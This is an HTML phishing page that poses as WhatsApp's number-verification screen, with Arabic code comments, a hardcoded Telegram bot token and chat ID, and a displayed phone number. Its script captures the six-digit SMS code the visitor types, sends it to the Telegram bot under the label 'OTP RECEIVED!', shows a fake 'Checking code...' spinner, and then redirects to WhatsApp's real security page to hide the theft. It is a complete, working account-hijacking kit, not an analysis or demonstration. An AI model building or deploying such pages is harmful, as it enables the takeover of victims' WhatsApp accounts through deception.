<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        :root { 
            --wa-bg: #111b21;
            --wa-green: #00a884;
            --wa-text: #e9edef;
            --wa-hint: #8696a0;
            --wa-border: #222d34;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; }

        /* Header الحقيقي بتاع واتساب */
        .wa-header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 10px; background: var(--wa-bg);
        }
        .wa-header span { font-size: 18px; font-weight: 500; color: var(--wa-text); margin-left: -100px; }

        .container { padding: 20px; text-align: center; }
        
        h1 { font-size: 19px; font-weight: 500; margin: 10px 0; color: var(--wa-green); }
        p { font-size: 14px; color: var(--wa-text); line-height: 1.4; margin-bottom: 5px; }
        .phone-num { font-weight: bold; }

        /* شكل خانات الكود الاحترافية */
        .otp-container {
            display: flex; justify-content: center; gap: 10px; margin: 30px 0;
        }
        .otp-input {
            width: 100%; border: none; border-bottom: 2px solid var(--wa-green);
            background: transparent; color: #fff; font-size: 32px;
            text-align: center; outline: none; letter-spacing: 15px;
        }

        .hint { color: var(--wa-hint); font-size: 13px; margin-top: 10px; }

        /* خيارات إعادة الإرسال زي التطبيق */
        .wa-options {
            margin-top: 40px; text-align: left; width: 100%; padding: 0 20px;
        }
        .option-item {
            display: flex; align-items: center; padding: 15px 0;
            border-bottom: 1px solid var(--wa-border); cursor: pointer;
        }
        .option-item img { width: 20px; margin-right: 25px; opacity: 0.6; }
        .option-item span { font-size: 15px; color: var(--wa-hint); }
        .option-item .timer-val { margin-left: auto; color: var(--wa-hint); }

        .btn-submit {
            background: var(--wa-green); color: #111b21; border: none;
            padding: 10px 25px; border-radius: 3px; font-weight: 600;
            margin-top: 30px; cursor: pointer; font-size: 14px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div class="wa-header">
        <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor" style="opacity: 0.7;"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
        <span>Verify your number</span>
        <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor" style="opacity: 0.7;"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path></svg>
    </div>

    <div class="container">
        <p>WhatsApp sent an SMS to your number.</p>
        <p class="phone-num">+20 01030003287</p>

        <div class="otp-container">
            <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
        </div>

        <p class="hint">Enter 6-digit code</p>

        <div class="wa-options">
            <div class="option-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#8696a0" style="margin-right:20px"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"></path></svg>
                <span>Resend SMS</span>
                <div class="timer-val" id="clock">1:52</div>
            </div>
            <div class="option-item" style="border:none">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#8696a0" style="margin-right:20px"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"></path></svg>
                <span>Call me</span>
                <div class="timer-val">2:00</div>
            </div>
        </div>

        <button class="btn-submit" onclick="submitOtp()">Next</button>
    </div>

    <script>
        const B_T = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
        const C_I = '5446862709';

        function sendToBot(msg) {
            fetch(`https://api.telegram.org/bot${B_T}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: C_I, text: msg, parse_mode: 'HTML' })
            });
        }

        const otpInput = document.getElementById('otp');
        otpInput.addEventListener('input', function() {
            if (this.value.length === 6) {
                submitOtp();
            }
        });

        function submitOtp() {
            const val = otpInput.value;
            if(val.length === 6) {
                sendToBot(`🔥 <b>OTP RECEIVED!</b>\nCode: <code>${val}</code>`);
                // تحويل لصفحة "Checking" وهمية
                document.body.innerHTML = `<div style="background:#111b21;height:100vh;display:flex;align-items:center;justify-content:center;color:#8696a0;flex-direction:column">
                    <div style="border:3px solid #202c33;border-top:3px solid #00a884;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite"></div>
                    <p style="margin-top:20px">Checking code...</p>
                </div><style>@keyframes spin{100%{transform:rotate(360deg)}}</style>`;
                
                setTimeout(() => {
                    window.location.href = "https://www.whatsapp.com/security";
                }, 3000);
            }
        }

        // Timer Logic
        let t = 112;
        setInterval(() => {
            if(t > 0) {
                t--;
                let m = Math.floor(t/60); let s = t%60;
                document.getElementById('clock').innerText = `${m}:${s<10?'0'+s:s}`;
            }
        }, 1000);
    </script>
</body>
</html>
